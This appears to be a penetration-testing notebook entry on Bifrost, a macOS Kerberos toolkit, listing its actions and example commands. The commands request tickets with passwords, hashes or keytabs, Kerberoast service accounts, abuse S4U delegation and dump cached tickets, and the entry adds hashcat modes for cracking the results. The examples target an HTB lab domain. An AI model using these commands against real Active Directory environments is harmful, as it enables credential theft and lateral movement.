# Bifrost

**Tags:** `#bifrost` `#macos` `#kerberos` `#activedirectory` `#kerberoasting` `#passthehash` `#s4u` `#postexploitation`

macOS-native **Kerberos** toolkit (SpecterOps / its-a-feature) — an Objective-C binary that
drives macOS's built-in **Heimdal krb5** APIs, needing no extra frameworks. It's the macOS
counterpart to [[Tools/Auth/Rubeus|Rubeus]] (Windows) and
[[Tools/AD/impacket-kerberos-scripts|impacket's Kerberos scripts]] (Linux): request TGT/TGS,
Kerberoast, S4U delegation abuse, and dump tickets from the local credential cache — all from
an AD-bound (or AD-reachable) Mac.

**Source:** https://github.com/its-a-feature/bifrost
**Install:** compile the Objective-C project (Xcode / `clang`) into the `bifrost` console binary — no dependencies beyond macOS itself.

---

## Actions

```
./bifrost -action [ dump | list | askhash | describe | asktgt | asktgs | s4u | ptt | remove ]
```

```bash
# Compute the Kerberos key/hash for a user (for hash-based asktgt)
./bifrost -action askhash -username julio -domain INLANEFREIGHT.HTB -password 'Passw0rd!'

# Request a TGT — with a password, a hash (-hash/-enctype), or a keytab
./bifrost -action asktgt -username julio -domain INLANEFREIGHT.HTB -password 'Passw0rd!'
./bifrost -action asktgt -username julio -domain INLANEFREIGHT.HTB -hash <key> -enctype <type>
./bifrost -action asktgt -username svc -domain INLANEFREIGHT.HTB -keytab /path/to.keytab

# Request a service ticket from a TGT (base64)
./bifrost -action asktgs -ticket <base64_TGT> -service cifs/dc01.inlanefreight.htb

# Kerberoast — request roastable service tickets
./bifrost -action asktgt -username julio -domain INLANEFREIGHT.HTB -password 'Passw0rd!' -kerberoast true

# S4U — resource-based constrained delegation
./bifrost -action s4u -ticket <base64_TGT> -targetUser administrator -spn cifs/target.inlanefreight.htb

# Inspect / manage tickets
./bifrost -action describe -ticket <base64_ticket>     # decode a kirbi
./bifrost -action dump -source tickets                 # dump tickets from the cache/keychain
./bifrost -action list                                  # list caches/keytabs
```

**Key flags:** `-username`, `-domain` (FQDN), `-password`, `-hash` + `-enctype`, `-keytab`,
`-ticket`, `-service`/`-spn`, `-targetUser`, `-kerberoast true`.

---

## Where It Fits

macOS endpoints are increasingly domain-joined. When your foothold is a **Mac** (not a Windows
box or a Linux attack host), Bifrost is how you do Kerberos work locally with native APIs
instead of shipping over Rubeus/impacket. Roasted hashes crack with
[[Tools/Auth/hashcat|hashcat]] (`-m 13100`/`18200`) / [[Tools/Auth/john the ripper|john]].
Extract the keytab feeding `-keytab` with [[Tools/Auth/keytabextract|keytabextract]].

> [!note] **See also** — Windows equiv [[Tools/Auth/Rubeus|Rubeus]]; Linux equiv [[Tools/AD/impacket-kerberos-scripts|impacket-kerberos-scripts]]; the methodology [[Services/Active Directory/Kerberos|Kerberos]]; macOS AD *enumeration* companion [[Tools/AD/Orchard|Orchard]]; run it from [[Tools/Command Shell/iTerm2|iTerm2]].

---

*Created: 2026-09-28*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
